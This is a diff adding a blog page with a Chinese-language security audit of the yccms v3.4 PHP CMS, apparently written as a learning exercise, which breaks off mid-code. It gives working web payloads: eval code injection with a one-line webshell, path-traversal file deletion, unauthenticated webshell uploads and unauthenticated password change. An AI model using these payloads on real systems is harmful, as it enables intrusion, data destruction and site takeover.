@@ -1,0 +1,831 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.jpg">
+  <link rel="icon" href="/img/fluid.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="huangdi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="yccms代码审计(php)搭建环境 更改config.inc.php对应的数据库名，用户名及密码即可 运行yccms.sql文件，在数据库中导入sql数据 访问http:&#x2F;&#x2F;域名&#x2F;admin，用户名及密码都为admin，登录后台  配置xdebug参考文章： 2024年更新，PhpStorm配置Xdebug最完整最详解教程，100%成功！ - 个人文章 - Segm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="yccms代码审计(php)">
+<meta property="og:url" content="http://huang-d1.github.io/2025/07/08/yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/index.html">
+<meta property="og:site_name" content="huangdi&#39;s blog">
+<meta property="og:description" content="yccms代码审计(php)搭建环境 更改config.inc.php对应的数据库名，用户名及密码即可 运行yccms.sql文件，在数据库中导入sql数据 访问http:&#x2F;&#x2F;域名&#x2F;admin，用户名及密码都为admin，登录后台  配置xdebug参考文章： 2024年更新，PhpStorm配置Xdebug最完整最详解教程，100%成功！ - 个人文章 - Segm">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms02.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms03.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms04.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms05.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms06.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms07.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms01.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms08.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms10.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms11.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms13.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms14.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms15.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms16.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms17.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms18.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms19.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/yccms/yccms09.png">
+<meta property="article:published_time" content="2025-07-08T06:29:50.182Z">
+<meta property="article:modified_time" content="2025-07-09T16:13:29.136Z">
+<meta property="article:author" content="huangdi">
+<meta property="article:tag" content="php代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://huang-d1.github.io/img/yccms/yccms02.png">
+  
+  
+  
+  <title>yccms代码审计(php) - huangdi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"huang-d1.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>huang-d1&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="yccms代码审计(php)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-08 14:29" pubdate>
+          July 8, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">yccms代码审计(php)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="yccms代码审计-php"><a href="#yccms代码审计-php" class="headerlink" title="yccms代码审计(php)"></a>yccms代码审计(php)</h1><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><ul>
+<li>更改config.inc.php对应的数据库名，用户名及密码即可</li>
+<li>运行yccms.sql文件，在数据库中导入sql数据</li>
+<li>访问http:&#x2F;&#x2F;域名&#x2F;admin，用户名及密码都为admin，登录后台</li>
+</ul>
+<h3 id="配置xdebug"><a href="#配置xdebug" class="headerlink" title="配置xdebug"></a>配置xdebug</h3><h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><ul>
+<li><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018961750">2024年更新，PhpStorm配置Xdebug最完整最详解教程，100%成功！ - 个人文章 - SegmentFault 思否</a></p>
+</li>
+<li><p>小迪安全php代码审计课程 day108</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/7K8edea8imalZ8_jJp3ODw">phpstorm+phpstudy 配置xdebug (qq.com)</a></p>
+</li>
+</ul>
+<h4 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h4><ul>
+<li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php-&gt;sever</p>
+<p>新建一个服务器，名称任意，端口与网站搭建端口一致</p>
+<p><img src="/img/yccms/yccms02.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+</li>
+<li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php-&gt;Debug(调试)</p>
+<p>设置端口号为9100，防止端口进程冲突</p>
+<p><img src="/img/yccms/yccms03.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>调试下的DBGp按照如图设置，端口与刚刚设置的调试端口相对应</p>
+<p><img src="/img/yccms/yccms04.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>打开phpstudy，查看网站使用的php版本</p>
+<p>在软件管理选项中找到对应的php版本，点击设置</p>
+<p>打开xdebug调试组件，端口监听与刚刚设置的调试端口设为一致</p>
+<p><img src="/img/yccms/yccms05.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+</li>
+<li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php</p>
+<p>将版本设置为与刚刚在phpstudy中查看的此网站使用的php版本</p>
+<p><img src="/img/yccms/yccms06.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+</li>
+<li><p>右上角添加配置中选择php网页添加配置</p>
+<p><img src="/img/yccms/yccms07.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+</li>
+</ul>
+<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p><img src="/img/yccms/yccms01.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>可以看出此源码是MVC结构，最核心的控制代码在controller与model文件夹内</p>
+<p>翻看目录发现此源码使用了smarty模板，随后可以查看是否存在ssti模板注入</p>
+<h4 id="路由关系"><a href="#路由关系" class="headerlink" title="路由关系"></a>路由关系</h4><ul>
+<li><p>?a&#x3D;admin&amp;m&#x3D;update</p>
+<p>key值为a传入类名，key值为m传入方法名</p>
+</li>
+</ul>
+<h4 id="漏洞复现-有入口，才可利用"><a href="#漏洞复现-有入口，才可利用" class="headerlink" title="漏洞复现(有入口，才可利用)"></a>漏洞复现(有入口，才可利用)</h4><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/KRookieSec/p/17142265.html">记一次完整的PHP代码审计——yccms v3.4审计 - KRookieSec - 博客园 (cnblogs.com)</a></p>
+<p>​		   <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9362">代码审计—YCCMS系统-先知社区 (aliyun.com)</a></p>
+<p>使用seay进行自动化审计，找到可能存在漏洞的地方，逐个测试</p>
+<p><img src="/img/yccms/yccms08.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<h5 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h5><p>找到此方法是否有被实例化</p>
+<p>发现run.inc.php实例化此方法，admin&#x2F;index.php包含了此文件</p>
+<p>public&#x2F;class目录下的Factory.class.php文件，文件类名为Factory</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setModel</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-variable">$_a</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/model/&#x27;</span>.<span class="hljs-variable">$_a</span>.<span class="hljs-string">&#x27;Model.class.php&#x27;</span>)) <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Model();&#x27;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>eval函数内变量可控</p>
+<p>需要传入一个类名，并且满足(或绕过)file_exists()函数的检查</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?a=Factory();phpinfo();//../<br></code></pre></td></tr></table></figure>
+
+<p>分析：</p>
+<ol>
+<li>调用Factory()类中方法</li>
+<li>用;隔开以执行下一条语句</li>
+<li>&#x2F;..&#x2F;跳至上一级绕过file_exist()函数检测</li>
+</ol>
+<p>顺利注入</p>
+<p><img src="/img/yccms/yccms10.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>尝试写入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?a=Factory();@eval($_POST[v]);//../<br></code></pre></td></tr></table></figure>
+
+<p>看一些文章是可以顺利连接的，我这里没有成功</p>
+<h5 id="无需登录文件删除"><a href="#无需登录文件删除" class="headerlink" title="无需登录文件删除"></a>无需登录文件删除</h5><p>controller&#x2F;PicAction.class.php文件中控制删除功能的方法没有对文件名及文件路径的检测</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-comment">// 定义一个公共方法 delall，用于删除图片</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123; <span class="hljs-comment">// 如果表单提交了（send 参数存在）</span><br>        <span class="hljs-comment">// 如果 pid 参数为空（即用户没有选择任何图片）</span><br>        <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>])) <br>            <span class="hljs-comment">// 弹出警告框提示“没有选择任何图片”，然后跳转回 pic 页面</span><br>            tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br><br>        <span class="hljs-variable">$_fileDir</span> = ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>; <span class="hljs-comment">// 图片文件所在的目录</span><br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123; <span class="hljs-comment">// 遍历所有要删除的图片文件名</span><br>            <span class="hljs-variable">$_filePath</span> = <span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>; <span class="hljs-comment">// 构造完整的文件路径</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123; <span class="hljs-comment">// 尝试删除该文件，如果失败</span><br>                <span class="hljs-comment">// 弹出警告框提示“图片删除失败”，建议设置权限为 777</span><br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 删除成功后，立即重定向回 pic 页面</span><br>                <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其他文件有文件路径检测，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_dirPath</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;\\&#x27;</span>.<span class="hljs-variable">$_navname</span>.<span class="hljs-string">&#x27;\\&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>开始测试</p>
+<p>寻找网站功能点：其他功能-&gt;图片管理</p>
+<p>点击删除按钮后抓取数据包，得到数据包内容</p>
+<p><img src="/img/yccms/yccms11.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>send值是url编码过的，解码后为删除选中图片</p>
+<p>pid后url编码解码后为[0]</p>
+<p>退出admin账户的登陆后，将网站根目录下CMS系统安装声明文件重命名为CMS(一会测试时无需再对中文url编码)</p>
+<p>更改数据包pid[0]参数的值为&#x2F;..&#x2F;CMS，发送数据包，发现成功删除文件</p>
+<h5 id="无需登录文章删除"><a href="#无需登录文章删除" class="headerlink" title="无需登录文章删除"></a>无需登录文章删除</h5><p>controller&#x2F;ArticleAction.class.php</p>
+<p>漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br>			<span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>])) tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何内容!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br>			<span class="hljs-comment">//$this-&gt;_model-&gt;id=implode(&#x27;,&#x27;,$_POST[&#x27;showid&#x27;]);</span><br>			<span class="hljs-comment">//echo $this-&gt;_model-&gt;id;</span><br>			<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br>				<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<br>				<span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br>				<span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br>				<span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br>					<span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;		<br>				&#125;<br>				<span class="hljs-comment">//先删除静态文件</span><br>				<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>				<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>					tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;静态文件删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">5</span>);<br>				&#125;<br>				&#125;<br>				<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>();<br>				<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>			&#125;<br>		&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过代码可以看到基本上是没有检测的，传入id即可删除对应的文章，但是由于变量是固定的，所以只能删除文章</p>
+<p>不能删除其他文件</p>
+<p>开始测试：</p>
+<p>寻找功能点：内容管理-&gt;文章列表</p>
+<p>点击删除抓取数据包</p>
+<p><img src="/img/yccms/yccms13.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>看到是直接get传参，更改id的值就可以的</p>
+<p>退出登录后更改id发送数据包，再次登录查看，发现顺利删除文章</p>
+<h5 id="无需登录文件上传01"><a href="#无需登录文件上传01" class="headerlink" title="无需登录文件上传01"></a>无需登录文件上传01</h5><p>public&#x2F;class&#x2F;FileUpload.class.php</p>
+<p>查看源代码发现只对上传图片类型和文件大小做了判断，并且进行了重命名</p>
+<p>在网站寻找功能点：系统设置-&gt;首页内容</p>
+<p>在编辑器自带的文件上传功能点处可以上传文件</p>
+<p>抓取数据包，更改文件名和文件内容，顺利上传</p>
+<p><img src="/img/yccms/yccms14.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>用蚁剑成功连接</p>
+<p><img src="/img/yccms/yccms15.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>经测试，退出登陆后直接发包也可以正常上传，可以正常连接</p>
+<h5 id="无需登录文件上传02"><a href="#无需登录文件上传02" class="headerlink" title="无需登录文件上传02"></a>无需登录文件上传02</h5><p>直接寻找功能点：系统设置-&gt;上传logo</p>
+<p>找到对应控制代码</p>
+<p><img src="/img/yccms/yccms16.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>上传后的文件会被重命名为logo，检验文件类型的函数极容易绕过</p>
+<p>方法同01抓取数据包后更改文件内容与文件名</p>
+<p>可以看到顺利上传</p>
+<p><img src="/img/yccms/yccms17.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>用蚁剑测试依旧是能够连接成功</p>
+<p><img src="/img/yccms/yccms18.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>退出登录后同样可以发送数据包并且用蚁剑顺利连接</p>
+<h5 id="任意密码修改-未鉴权"><a href="#任意密码修改-未鉴权" class="headerlink" title="任意密码修改(未鉴权)"></a>任意密码修改(未鉴权)</h5><p>controller&#x2F;AdminAction.class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//后台初始</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br>			<span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br>			<span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/admin.tpl&#x27;</span>);<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertLocation</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>		&#125;<br>		<br>	&#125;<br>	<span class="hljs-comment">//修改密码</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br>			<span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;用户名不能为空&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>			<span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;密码不能为空!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>			<span class="hljs-keyword">if</span>(!(validate::<span class="hljs-title function_ invoke__">checkStrEquals</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;notpassword&#x27;</span>]))) <span class="hljs-title 